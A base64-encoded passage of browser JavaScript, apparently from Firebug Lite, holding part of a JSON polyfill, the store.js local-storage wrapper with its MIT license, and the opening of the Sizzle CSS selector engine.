NCiAgICAgICAgICAgIH0NCg0KLy8gSWYgdGhlcmUgaXMgYSByZXBsYWNlciwgaXQgbXVzdCBiZSBhIGZ1bmN0aW9uIG9yIGFuIGFycmF5Lg0KLy8gT3RoZXJ3aXNlLCB0aHJvdyBhbiBlcnJvci4NCg0KICAgICAgICAgICAgcmVwID0gcmVwbGFjZXI7DQogICAgICAgICAgICBpZiAocmVwbGFjZXIgJiYgdHlwZW9mIHJlcGxhY2VyICE9PSAnZnVuY3Rpb24nICYmDQogICAgICAgICAgICAgICAgICAgICh0eXBlb2YgcmVwbGFjZXIgIT09ICdvYmplY3QnIHx8DQogICAgICAgICAgICAgICAgICAgICB0eXBlb2YgcmVwbGFjZXIubGVuZ3RoICE9PSAnbnVtYmVyJykpIHsNCiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoJ0pTT04uc3RyaW5naWZ5Jyk7DQogICAgICAgICAgICB9DQoNCi8vIE1ha2UgYSBmYWtlIHJvb3Qgb2JqZWN0IGNvbnRhaW5pbmcgb3VyIHZhbHVlIHVuZGVyIHRoZSBrZXkgb2YgJycuDQovLyBSZXR1cm4gdGhlIHJlc3VsdCBvZiBzdHJpbmdpZnlpbmcgdGhlIHZhbHVlLg0KDQogICAgICAgICAgICByZXR1cm4gc3RyKCcnLCB7Jyc6IHZhbHVlfSk7DQogICAgICAgIH07DQogICAgfQ0KDQoNCi8vIElmIHRoZSBKU09OIG9iamVjdCBkb2VzIG5vdCB5ZXQgaGF2ZSBhIHBhcnNlIG1ldGhvZCwgZ2l2ZSBpdCBvbmUuDQoNCiAgICBpZiAodHlwZW9mIEpTT04ucGFyc2UgIT09ICdmdW5jdGlvbicpIHsNCiAgICAgICAgSlNPTi5wYXJzZSA9IGZ1bmN0aW9uICh0ZXh0LCByZXZpdmVyKSB7DQoNCi8vIFRoZSBwYXJzZSBtZXRob2QgdGFrZXMgYSB0ZXh0IGFuZCBhbiBvcHRpb25hbCByZXZpdmVyIGZ1bmN0aW9uLCBhbmQgcmV0dXJucw0KLy8gYSBKYXZhU2NyaXB0IHZhbHVlIGlmIHRoZSB0ZXh0IGlzIGEgdmFsaWQgSlNPTiB0ZXh0Lg0KDQogICAgICAgICAgICB2YXIgajsNCg0KICAgICAgICAgICAgZnVuY3Rpb24gd2Fsayhob2xkZXIsIGtleSkgew0KDQovLyBUaGUgd2FsayBtZXRob2QgaXMgdXNlZCB0byByZWN1cnNpdmVseSB3YWxrIHRoZSByZXN1bHRpbmcgc3RydWN0dXJlIHNvDQovLyB0aGF0IG1vZGlmaWNhdGlvbnMgY2FuIGJlIG1hZGUuDQoNCiAgICAgICAgICAgICAgICB2YXIgaywgdiwgdmFsdWUgPSBob2xkZXJba2V5XTsNCiAgICAgICAgICAgICAgICBpZiAodmFsdWUgJiYgdHlwZW9mIHZhbHVlID09PSAnb2JqZWN0Jykgew0KICAgICAgICAgICAgICAgICAgICBmb3IgKGsgaW4gdmFsdWUpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChPYmplY3QuaGFzT3duUHJvcGVydHkuY2FsbCh2YWx1ZSwgaykpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB2ID0gd2Fsayh2YWx1ZSwgayk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHYgIT09IHVuZGVmaW5lZCkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YWx1ZVtrXSA9IHY7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGVsZXRlIHZhbHVlW2tdOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICByZXR1cm4gcmV2aXZlci5jYWxsKGhvbGRlciwga2V5LCB2YWx1ZSk7DQogICAgICAgICAgICB9DQoNCg0KLy8gUGFyc2luZyBoYXBwZW5zIGluIGZvdXIgc3RhZ2VzLiBJbiB0aGUgZmlyc3Qgc3RhZ2UsIHdlIHJlcGxhY2UgY2VydGFpbg0KLy8gVW5pY29kZSBjaGFyYWN0ZXJzIHdpdGggZXNjYXBlIHNlcXVlbmNlcy4gSmF2YVNjcmlwdCBoYW5kbGVzIG1hbnkgY2hhcmFjdGVycw0KLy8gaW5jb3JyZWN0bHksIGVpdGhlciBzaWxlbnRseSBkZWxldGluZyB0aGVtLCBvciB0cmVhdGluZyB0aGVtIGFzIGxpbmUgZW5kaW5ncy4NCg0KICAgICAgICAgICAgdGV4dCA9IFN0cmluZyh0ZXh0KTsNCiAgICAgICAgICAgIGN4Lmxhc3RJbmRleCA9IDA7DQogICAgICAgICAgICBpZiAoY3gudGVzdCh0ZXh0KSkgew0KICAgICAgICAgICAgICAgIHRleHQgPSB0ZXh0LnJlcGxhY2UoY3gsIGZ1bmN0aW9uIChhKSB7DQogICAgICAgICAgICAgICAgICAgIHJldHVybiAnXFx1JyArDQogICAgICAgICAgICAgICAgICAgICAgICAoJzAwMDAnICsgYS5jaGFyQ29kZUF0KDApLnRvU3RyaW5nKDE2KSkuc2xpY2UoLTQpOw0KICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgfQ0KDQovLyBJbiB0aGUgc2Vjb25kIHN0YWdlLCB3ZSBydW4gdGhlIHRleHQgYWdhaW5zdCByZWd1bGFyIGV4cHJlc3Npb25zIHRoYXQgbG9vaw0KLy8gZm9yIG5vbi1KU09OIHBhdHRlcm5zLiBXZSBhcmUgZXNwZWNpYWxseSBjb25jZXJuZWQgd2l0aCAnKCknIGFuZCAnbmV3Jw0KLy8gYmVjYXVzZSB0aGV5IGNhbiBjYXVzZSBpbnZvY2F0aW9uLCBhbmQgJz0nIGJlY2F1c2UgaXQgY2FuIGNhdXNlIG11dGF0aW9uLg0KLy8gQnV0IGp1c3QgdG8gYmUgc2FmZSwgd2Ugd2FudCB0byByZWplY3QgYWxsIHVuZXhwZWN0ZWQgZm9ybXMuDQoNCi8vIFdlIHNwbGl0IHRoZSBzZWNvbmQgc3RhZ2UgaW50byA0IHJlZ2V4cCBvcGVyYXRpb25zIGluIG9yZGVyIHRvIHdvcmsgYXJvdW5kDQovLyBjcmlwcGxpbmcgaW5lZmZpY2llbmNpZXMgaW4gSUUncyBhbmQgU2FmYXJpJ3MgcmVnZXhwIGVuZ2luZXMuIEZpcnN0IHdlDQovLyByZXBsYWNlIHRoZSBKU09OIGJhY2tzbGFzaCBwYWlycyB3aXRoICdAJyAoYSBub24tSlNPTiBjaGFyYWN0ZXIpLiBTZWNvbmQsIHdlDQovLyByZXBsYWNlIGFsbCBzaW1wbGUgdmFsdWUgdG9rZW5zIHdpdGggJ10nIGNoYXJhY3RlcnMuIFRoaXJkLCB3ZSBkZWxldGUgYWxsDQovLyBvcGVuIGJyYWNrZXRzIHRoYXQgZm9sbG93IGEgY29sb24gb3IgY29tbWEgb3IgdGhhdCBiZWdpbiB0aGUgdGV4dC4gRmluYWxseSwNCi8vIHdlIGxvb2sgdG8gc2VlIHRoYXQgdGhlIHJlbWFpbmluZyBjaGFyYWN0ZXJzIGFyZSBvbmx5IHdoaXRlc3BhY2Ugb3IgJ10nIG9yDQovLyAnLCcgb3IgJzonIG9yICd7JyBvciAnfScuIElmIHRoYXQgaXMgc28sIHRoZW4gdGhlIHRleHQgaXMgc2FmZSBmb3IgZXZhbC4NCg0KICAgICAgICAgICAgaWYgKC9eW1xdLDp7fVxzXSokLy4NCnRlc3QodGV4dC5yZXBsYWNlKC9cXCg/OlsiXFxcL2JmbnJ0XXx1WzAtOWEtZkEtRl17NH0pL2csICdAJykuDQpyZXBsYWNlKC8iW14iXFxcblxyXSoifHRydWV8ZmFsc2V8bnVsbHwtP1xkKyg/OlwuXGQqKT8oPzpbZUVdWytcLV0/XGQrKT8vZywgJ10nKS4NCnJlcGxhY2UoLyg/Ol58OnwsKSg/OlxzKlxbKSsvZywgJycpKSkgew0KDQovLyBJbiB0aGUgdGhpcmQgc3RhZ2Ugd2UgdXNlIHRoZSBldmFsIGZ1bmN0aW9uIHRvIGNvbXBpbGUgdGhlIHRleHQgaW50byBhDQovLyBKYXZhU2NyaXB0IHN0cnVjdHVyZS4gVGhlICd7JyBvcGVyYXRvciBpcyBzdWJqZWN0IHRvIGEgc3ludGFjdGljIGFtYmlndWl0eQ0KLy8gaW4gSmF2YVNjcmlwdDogaXQgY2FuIGJlZ2luIGEgYmxvY2sgb3IgYW4gb2JqZWN0IGxpdGVyYWwuIFdlIHdyYXAgdGhlIHRleHQNCi8vIGluIHBhcmVucyB0byBlbGltaW5hdGUgdGhlIGFtYmlndWl0eS4NCg0KICAgICAgICAgICAgICAgIGogPSBldmFsKCcoJyArIHRleHQgKyAnKScpOw0KDQovLyBJbiB0aGUgb3B0aW9uYWwgZm91cnRoIHN0YWdlLCB3ZSByZWN1cnNpdmVseSB3YWxrIHRoZSBuZXcgc3RydWN0dXJlLCBwYXNzaW5nDQovLyBlYWNoIG5hbWUvdmFsdWUgcGFpciB0byBhIHJldml2ZXIgZnVuY3Rpb24gZm9yIHBvc3NpYmxlIHRyYW5zZm9ybWF0aW9uLg0KDQogICAgICAgICAgICAgICAgcmV0dXJuIHR5cGVvZiByZXZpdmVyID09PSAnZnVuY3Rpb24nID8NCiAgICAgICAgICAgICAgICAgICAgd2Fsayh7Jyc6IGp9LCAnJykgOiBqOw0KICAgICAgICAgICAgfQ0KDQovLyBJZiB0aGUgdGV4dCBpcyBub3QgSlNPTiBwYXJzZWFibGUsIHRoZW4gYSBTeW50YXhFcnJvciBpcyB0aHJvd24uDQoNCiAgICAgICAgICAgIHRocm93IG5ldyBTeW50YXhFcnJvcignSlNPTi5wYXJzZScpOw0KICAgICAgICB9Ow0KICAgIH0NCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQovLyByZWdpc3RyYXRpb24NCg0KRkJMLkpTT04gPSBKU09OOw0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCn0oKSk7DQoNCi8qIFNlZSBsaWNlbnNlLnR4dCBmb3IgdGVybXMgb2YgdXNhZ2UgKi8NCg0KKGZ1bmN0aW9uKCl7DQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCg0KLyogQ29weXJpZ2h0IChjKSAyMDEwLTIwMTEgTWFyY3VzIFdlc3Rpbg0KICoNCiAqIFBlcm1pc3Npb24gaXMgaGVyZWJ5IGdyYW50ZWQsIGZyZWUgb2YgY2hhcmdlLCB0byBhbnkgcGVyc29uIG9idGFpbmluZyBhIGNvcHkNCiAqIG9mIHRoaXMgc29mdHdhcmUgYW5kIGFzc29jaWF0ZWQgZG9jdW1lbnRhdGlvbiBmaWxlcyAodGhlICJTb2Z0d2FyZSIpLCB0byBkZWFsDQogKiBpbiB0aGUgU29mdHdhcmUgd2l0aG91dCByZXN0cmljdGlvbiwgaW5jbHVkaW5nIHdpdGhvdXQgbGltaXRhdGlvbiB0aGUgcmlnaHRzDQogKiB0byB1c2UsIGNvcHksIG1vZGlmeSwgbWVyZ2UsIHB1Ymxpc2gsIGRpc3RyaWJ1dGUsIHN1YmxpY2Vuc2UsIGFuZC9vciBzZWxsDQogKiBjb3BpZXMgb2YgdGhlIFNvZnR3YXJlLCBhbmQgdG8gcGVybWl0IHBlcnNvbnMgdG8gd2hvbSB0aGUgU29mdHdhcmUgaXMNCiAqIGZ1cm5pc2hlZCB0byBkbyBzbywgc3ViamVjdCB0byB0aGUgZm9sbG93aW5nIGNvbmRpdGlvbnM6DQogKg0KICogVGhlIGFib3ZlIGNvcHlyaWdodCBub3RpY2UgYW5kIHRoaXMgcGVybWlzc2lvbiBub3RpY2Ugc2hhbGwgYmUgaW5jbHVkZWQgaW4NCiAqIGFsbCBjb3BpZXMgb3Igc3Vic3RhbnRpYWwgcG9ydGlvbnMgb2YgdGhlIFNvZnR3YXJlLg0KICoNCiAqIFRIRSBTT0ZUV0FSRSBJUyBQUk9WSURFRCAiQVMgSVMiLCBXSVRIT1VUIFdBUlJBTlRZIE9GIEFOWSBLSU5ELCBFWFBSRVNTIE9SDQogKiBJTVBMSUVELCBJTkNMVURJTkcgQlVUIE5PVCBMSU1JVEVEIFRPIFRIRSBXQVJSQU5USUVTIE9GIE1FUkNIQU5UQUJJTElUWSwNCiAqIEZJVE5FU1MgRk9SIEEgUEFSVElDVUxBUiBQVVJQT1NFIEFORCBOT05JTkZSSU5HRU1FTlQuIElOIE5PIEVWRU5UIFNIQUxMIFRIRQ0KICogQVVUSE9SUyBPUiBDT1BZUklHSFQgSE9MREVSUyBCRSBMSUFCTEUgRk9SIEFOWSBDTEFJTSwgREFNQUdFUyBPUiBPVEhFUg0KICogTElBQklMSVRZLCBXSEVUSEVSIElOIEFOIEFDVElPTiBPRiBDT05UUkFDVCwgVE9SVCBPUiBPVEhFUldJU0UsIEFSSVNJTkcgRlJPTSwNCiAqIE9VVCBPRiBPUiBJTiBDT05ORUNUSU9OIFdJVEggVEhFIFNPRlRXQVJFIE9SIFRIRSBVU0UgT1IgT1RIRVIgREVBTElOR1MgSU4NCiAqIFRIRSBTT0ZUV0FSRS4NCiAqLw0KDQp2YXIgc3RvcmUgPSAoZnVuY3Rpb24oKXsNCgl2YXIgYXBpID0ge30sDQoJCXdpbiA9IHdpbmRvdywNCgkJZG9jID0gd2luLmRvY3VtZW50LA0KCQlsb2NhbFN0b3JhZ2VOYW1lID0gJ2xvY2FsU3RvcmFnZScsDQoJCWdsb2JhbFN0b3JhZ2VOYW1lID0gJ2dsb2JhbFN0b3JhZ2UnLA0KCQluYW1lc3BhY2UgPSAnX19maXJlYnVnX19zdG9yZWpzX18nLA0KCQlzdG9yYWdlDQoNCglhcGkuZGlzYWJsZWQgPSBmYWxzZQ0KCWFwaS5zZXQgPSBmdW5jdGlvbihrZXksIHZhbHVlKSB7fQ0KCWFwaS5nZXQgPSBmdW5jdGlvbihrZXkpIHt9DQoJYXBpLnJlbW92ZSA9IGZ1bmN0aW9uKGtleSkge30NCglhcGkuY2xlYXIgPSBmdW5jdGlvbigpIHt9DQoJYXBpLnRyYW5zYWN0ID0gZnVuY3Rpb24oa2V5LCB0cmFuc2FjdGlvbkZuKSB7DQoJCXZhciB2YWwgPSBhcGkuZ2V0KGtleSkNCgkJaWYgKHR5cGVvZiB2YWwgPT0gJ3VuZGVmaW5lZCcpIHsgdmFsID0ge30gfQ0KCQl0cmFuc2FjdGlvbkZuKHZhbCkNCgkJYXBpLnNldChrZXksIHZhbCkNCgl9DQoNCglhcGkuc2VyaWFsaXplID0gZnVuY3Rpb24odmFsdWUpIHsNCgkJcmV0dXJuIEpTT04uc3RyaW5naWZ5KHZhbHVlKQ0KCX0NCglhcGkuZGVzZXJpYWxpemUgPSBmdW5jdGlvbih2YWx1ZSkgew0KCQlpZiAodHlwZW9mIHZhbHVlICE9ICdzdHJpbmcnKSB7IHJldHVybiB1bmRlZmluZWQgfQ0KCQlyZXR1cm4gSlNPTi5wYXJzZSh2YWx1ZSkNCgl9DQoNCgkvLyBGdW5jdGlvbnMgdG8gZW5jYXBzdWxhdGUgcXVlc3Rpb25hYmxlIEZpcmVGb3ggMy42LjEzIGJlaGF2aW9yIA0KCS8vIHdoZW4gYWJvdXQuY29uZmlnOjpkb20uc3RvcmFnZS5lbmFibGVkID09PSBmYWxzZQ0KCS8vIFNlZSBodHRwczovL2dpdGh1Yi5jb20vbWFyY3Vzd2VzdGluL3N0b3JlLmpzL2lzc3VlcyNpc3N1ZS8xMw0KCWZ1bmN0aW9uIGlzTG9jYWxTdG9yYWdlTmFtZVN1cHBvcnRlZCgpIHsNCgkJdHJ5IHsgcmV0dXJuIChsb2NhbFN0b3JhZ2VOYW1lIGluIHdpbiAmJiB3aW5bbG9jYWxTdG9yYWdlTmFtZV0pIH0NCgkJY2F0Y2goZXJyKSB7IHJldHVybiBmYWxzZSB9DQoJfQ0KCQ0KCWZ1bmN0aW9uIGlzR2xvYmFsU3RvcmFnZU5hbWVTdXBwb3J0ZWQoKSB7DQoJCXRyeSB7IHJldHVybiAoZ2xvYmFsU3RvcmFnZU5hbWUgaW4gd2luICYmIHdpbltnbG9iYWxTdG9yYWdlTmFtZV0gJiYgd2luW2dsb2JhbFN0b3JhZ2VOYW1lXVt3aW4ubG9jYXRpb24uaG9zdG5hbWVdKSB9DQoJCWNhdGNoKGVycikgeyByZXR1cm4gZmFsc2UgfQ0KCX0JDQoNCglpZiAoaXNMb2NhbFN0b3JhZ2VOYW1lU3VwcG9ydGVkKCkpIHsNCgkJc3RvcmFnZSA9IHdpbltsb2NhbFN0b3JhZ2VOYW1lXQ0KCQlhcGkuc2V0ID0gZnVuY3Rpb24oa2V5LCB2YWwpIHsgc3RvcmFnZS5zZXRJdGVtKGtleSwgYXBpLnNlcmlhbGl6ZSh2YWwpKSB9DQoJCWFwaS5nZXQgPSBmdW5jdGlvbihrZXkpIHsgcmV0dXJuIGFwaS5kZXNlcmlhbGl6ZShzdG9yYWdlLmdldEl0ZW0oa2V5KSkgfQ0KCQlhcGkucmVtb3ZlID0gZnVuY3Rpb24oa2V5KSB7IHN0b3JhZ2UucmVtb3ZlSXRlbShrZXkpIH0NCgkJYXBpLmNsZWFyID0gZnVuY3Rpb24oKSB7IHN0b3JhZ2UuY2xlYXIoKSB9DQoNCgl9IGVsc2UgaWYgKGlzR2xvYmFsU3RvcmFnZU5hbWVTdXBwb3J0ZWQoKSkgew0KCQlzdG9yYWdlID0gd2luW2dsb2JhbFN0b3JhZ2VOYW1lXVt3aW4ubG9jYXRpb24uaG9zdG5hbWVdDQoJCWFwaS5zZXQgPSBmdW5jdGlvbihrZXksIHZhbCkgeyBzdG9yYWdlW2tleV0gPSBhcGkuc2VyaWFsaXplKHZhbCkgfQ0KCQlhcGkuZ2V0ID0gZnVuY3Rpb24oa2V5KSB7IHJldHVybiBhcGkuZGVzZXJpYWxpemUoc3RvcmFnZVtrZXldICYmIHN0b3JhZ2Vba2V5XS52YWx1ZSkgfQ0KCQlhcGkucmVtb3ZlID0gZnVuY3Rpb24oa2V5KSB7IGRlbGV0ZSBzdG9yYWdlW2tleV0gfQ0KCQlhcGkuY2xlYXIgPSBmdW5jdGlvbigpIHsgZm9yICh2YXIga2V5IGluIHN0b3JhZ2UgKSB7IGRlbGV0ZSBzdG9yYWdlW2tleV0gfSB9DQoNCgl9IGVsc2UgaWYgKGRvYy5kb2N1bWVudEVsZW1lbnQuYWRkQmVoYXZpb3IpIHsNCgkJdmFyIHN0b3JhZ2UgPSBkb2MuY3JlYXRlRWxlbWVudCgnZGl2JykNCgkJZnVuY3Rpb24gd2l0aElFU3RvcmFnZShzdG9yZUZ1bmN0aW9uKSB7DQoJCQlyZXR1cm4gZnVuY3Rpb24oKSB7DQoJCQkJdmFyIGFyZ3MgPSBBcnJheS5wcm90b3R5cGUuc2xpY2UuY2FsbChhcmd1bWVudHMsIDApDQoJCQkJYXJncy51bnNoaWZ0KHN0b3JhZ2UpDQoJCQkJLy8gU2VlIGh0dHA6Ly9tc2RuLm1pY3Jvc29mdC5jb20vZW4tdXMvbGlicmFyeS9tczUzMTA4MSh2PVZTLjg1KS5hc3B4DQoJCQkJLy8gYW5kIGh0dHA6Ly9tc2RuLm1pY3Jvc29mdC5jb20vZW4tdXMvbGlicmFyeS9tczUzMTQyNCh2PVZTLjg1KS5hc3B4DQoJCQkJLy8gVE9ETzogeHh4cGVkcm8gZG9jLmJvZHkgaXMgbm90IGFsd2F5cyBhdmFpbGFibGUgc28gd2UgbXVzdCB1c2UgZG9jLmRvY3VtZW50RWxlbWVudC4NCgkJCQkvLyBXZSBuZWVkIHRvIG1ha2Ugc3VyZSB0aGlzIGNoYW5nZSB3b24ndCBhZmZlY3QgdGhlIGJlaGF2aW9yIG9mIHRoaXMgbGlicmFyeS4NCgkJCQlkb2MuZG9jdW1lbnRFbGVtZW50LmFwcGVuZENoaWxkKHN0b3JhZ2UpDQoJCQkJc3RvcmFnZS5hZGRCZWhhdmlvcignI2RlZmF1bHQjdXNlckRhdGEnKQ0KCQkJCXN0b3JhZ2UubG9hZChsb2NhbFN0b3JhZ2VOYW1lKQ0KCQkJCXZhciByZXN1bHQgPSBzdG9yZUZ1bmN0aW9uLmFwcGx5KGFwaSwgYXJncykNCgkJCQlkb2MuZG9jdW1lbnRFbGVtZW50LnJlbW92ZUNoaWxkKHN0b3JhZ2UpDQoJCQkJcmV0dXJuIHJlc3VsdA0KCQkJfQ0KCQl9DQoJCWFwaS5zZXQgPSB3aXRoSUVTdG9yYWdlKGZ1bmN0aW9uKHN0b3JhZ2UsIGtleSwgdmFsKSB7DQoJCQlzdG9yYWdlLnNldEF0dHJpYnV0ZShrZXksIGFwaS5zZXJpYWxpemUodmFsKSkNCgkJCXN0b3JhZ2Uuc2F2ZShsb2NhbFN0b3JhZ2VOYW1lKQ0KCQl9KQ0KCQlhcGkuZ2V0ID0gd2l0aElFU3RvcmFnZShmdW5jdGlvbihzdG9yYWdlLCBrZXkpIHsNCgkJCXJldHVybiBhcGkuZGVzZXJpYWxpemUoc3RvcmFnZS5nZXRBdHRyaWJ1dGUoa2V5KSkNCgkJfSkNCgkJYXBpLnJlbW92ZSA9IHdpdGhJRVN0b3JhZ2UoZnVuY3Rpb24oc3RvcmFnZSwga2V5KSB7DQoJCQlzdG9yYWdlLnJlbW92ZUF0dHJpYnV0ZShrZXkpDQoJCQlzdG9yYWdlLnNhdmUobG9jYWxTdG9yYWdlTmFtZSkNCgkJfSkNCgkJYXBpLmNsZWFyID0gd2l0aElFU3RvcmFnZShmdW5jdGlvbihzdG9yYWdlKSB7DQoJCQl2YXIgYXR0cmlidXRlcyA9IHN0b3JhZ2UuWE1MRG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50LmF0dHJpYnV0ZXMNCgkJCXN0b3JhZ2UubG9hZChsb2NhbFN0b3JhZ2VOYW1lKQ0KCQkJZm9yICh2YXIgaT0wLCBhdHRyOyBhdHRyID0gYXR0cmlidXRlc1tpXTsgaSsrKSB7DQoJCQkJc3RvcmFnZS5yZW1vdmVBdHRyaWJ1dGUoYXR0ci5uYW1lKQ0KCQkJfQ0KCQkJc3RvcmFnZS5zYXZlKGxvY2FsU3RvcmFnZU5hbWUpDQoJCX0pDQoJfQ0KCQ0KCXRyeSB7DQoJCWFwaS5zZXQobmFtZXNwYWNlLCBuYW1lc3BhY2UpDQoJCWlmIChhcGkuZ2V0KG5hbWVzcGFjZSkgIT0gbmFtZXNwYWNlKSB7IGFwaS5kaXNhYmxlZCA9IHRydWUgfQ0KCQlhcGkucmVtb3ZlKG5hbWVzcGFjZSkNCgl9IGNhdGNoKGUpIHsNCgkJYXBpLmRpc2FibGVkID0gdHJ1ZQ0KCX0NCgkNCglyZXR1cm4gYXBpDQp9KSgpOw0KDQppZiAodHlwZW9mIG1vZHVsZSAhPSAndW5kZWZpbmVkJykgeyBtb2R1bGUuZXhwb3J0cyA9IHN0b3JlIH0NCg0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCi8vIHJlZ2lzdHJhdGlvbg0KDQpGQkwuU3RvcmUgPSBzdG9yZTsNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQp9KSgpOw0KDQovKiBTZWUgbGljZW5zZS50eHQgZm9yIHRlcm1zIG9mIHVzYWdlICovDQoNCkZCTC5ucyggLyoqQHNjb3BlIHNfc2VsZWN0b3IqLyBmdW5jdGlvbigpIHsgd2l0aCAoRkJMKSB7DQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCg0KLyoNCiAqIFNpenpsZSBDU1MgU2VsZWN0b3IgRW5naW5lIC0gdjEuMA0KICogIENvcHlyaWdodCAyMDA5LCBUaGUgRG9qbyBGb3VuZGF0aW9uDQogKiAgUmVsZWFzZWQgdW5kZXIgdGhlIE1JVCwgQlNELCBhbmQgR1BMIExpY2Vuc2VzLg0KICogIE1vcmUgaW5mb3JtYXRpb246IGh0dHA6Ly9zaXp6bGVqcy5jb20vDQogKi8NCg0KdmFyIGNodW5rZXIgPSAvKCg/OlwoKD86XChbXigpXStcKXxbXigpXSspK1wpfFxbKD86XFtbXltcXV0qXF18WyciXVteJyJdKlsnIl18W15bXF0nIl0rKStcXXxcXC58W14gPit+LChcW1xcXSspK3xbPit+XSkoXHMqLFxzKik/KCg/Oi58XHJ8XG4pKikvZywNCiAgICBkb25lID0gMCwNCiAgICB0b1N0cmluZyA9IE9iamVjdC5wcm90b3R5cGUudG9TdHJpbmcsDQogICAgaGFzRHVwbGljYXRlID0gZmFsc2UsDQogICAgYmFzZUhhc0R1cGxpY2F0ZSA9IHRydWU7DQoNCi8vIEhlcmUgd2UgY2hlY2sgaWYgdGhlIEphdmFTY3JpcHQgZW5naW5lIGlzIHVzaW5nIHNvbWUgc29ydCBvZg0KLy8gb3B0aW1pemF0aW9uIHdoZXJlIGl0IGRvZXMgbm90IGFsd2F5cyBjYWxsIG91ciBjb21wYXJpc2lvbg0KLy8gZnVuY3Rpb24uIElmIHRoYXQgaXMgdGhlIGNhc2UsIGRpc2NhcmQgdGhlIGhhc0R1cGxpY2F0ZSB2YWx1ZS4NCi8vICAgVGh1cyBmYXIgdGhhdCBpbmNsdWRlcyBHb29nbGUgQ2hyb21lLg0KWzAsIDBdLnNvcnQoZnVuY3Rpb24oKXsNCiAgICBiYXNlSGFzRHVwbGljYXRlID0gZmFsc2U7DQogICAgcmV0dXJuIDA7DQp9KTsNCg0KLyoqDQogKiBAbmFtZSBGaXJlYnVnLlNlbGVjdG9yIA0KICogQG5hbWVzcGFjZQ0KICovDQoNCi8qKg0KICogQGV4cG9ydHMgU2l6emxlIGFzIEZpcmVidWcuU2VsZWN0b3INCiAqLyANCnZhciBTaXp6bGUgPSBmdW5jdGlvbihzZWxlY3RvciwgY29udGV4dCwgcmVzdWx0cywgc2VlZCkgew0KICAgIHJlc3VsdHMgPSByZXN1bHRzIHx8IFtdOw0KICAgIHZhciBvcmlnQ29udGV4dCA9IGNvbnRleHQgPSBjb250ZXh0IHx8IGRvY3VtZW50Ow0KDQogICAgaWYgKCBjb250ZXh0Lm5vZGVUeXBlICE9PSAxICYmIGNvbnRleHQubm9kZVR5cGUgIT09IDkgKSB7DQogICAgICAgIHJldHVybiBbXTsNCiAgICB9DQogICAgDQogICAgaWYgKCAhc2VsZWN0b3IgfHwgdHlwZW9mIHNlbGVjdG9yICE9PSAic3RyaW5nIiApIHsNCiAgICAgICAgcmV0dXJuIHJlc3VsdHM7DQogICAgfQ0KDQogICAgdmFyIHBhcnRzID0gW10sIG0sIHNldCwgY2hlY2tTZXQsIGNoZWNrLCBtb2RlLCBleHRyYSwgcHJ1bmUgPSB0cnVlLCBjb250ZXh0WE1MID0gaXNYTUwoY29udGV4dCksDQogICAgICAgIHNvRmFyID0gc2VsZWN0b3I7DQogICAgDQogICAgLy8gUmVzZXQgdGhlIHBvc2l0aW9uIG9mIHRoZSBjaHVua2VyIHJlZ2V4cCAoc3RhcnQgZnJvbSBoZWFkKQ0KICAgIHdoaWxlICggKGNodW5rZXIuZXhlYygiIiksIG0gPSBjaHVua2VyLmV4ZWMoc29GYXIpKSAhPT0gbnVsbCApIHsNCiAgICAgICAgc29GYXIgPSBtWzNdOw0KICAgICAgICANCiAgICAgICAgcGFydHMucHVzaCggbVsxXSApOw0KICAgICAgICANCiAgICAgICAgaWYgKCBtWzJdICkgew0KICAgICAgICAgICAgZXh0cmEgPSBtWzNdOw0KICAgICAgICAgICAgYnJlYWs7DQogICAgICAgIH0NCiAgICB9DQoNCiAgICBpZiAoIHBhcnRzLmxlbmd0aCA+IDEgJiYgb3JpZ1BPUy5leGVjKCBzZWxlY3RvciApICkgew0KICAgICAgICBpZiAoIHBhcnRzLmxlbmd0aCA9PT0gMiAmJiBFeHByLnJlbGF0aXZlWyBwYXJ0c1swXSBdICkgew0KICAgICAgICAgICAgc2V0ID0gcG9zUHJvY2VzcyggcGFydHNbMF0gKyBwYXJ0c1sxXSwgY29udGV4dCApOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgc2V0ID0gRXhwci5yZWxhdGl2ZVsgcGFydHNbMF0gXSA/DQogICAgICAgICAgICAgICAgWyBjb250ZXh0IF0gOg0KICAgICAgICAgICAgICAgIFNpenpsZSggcGFydHMuc2hpZnQoKSwgY29udGV4dCApOw0KDQogICAgICAgICAgICB3aGlsZSAoIHBhcnRzLmxlbmd0aCApIHsNCiAgICAgICAgICAgICAgICBzZWxlY3RvciA9IHBhcnRzLnNoaWZ0KCk7DQoNCiAgICAgICAgICAgICAgICBpZiAoIEV4cHIucmVsYXRpdmVbIHNlbGVjdG9yIF0gKQ0KICAgICAgICAgICAgICAgICAgICBzZWxlY3R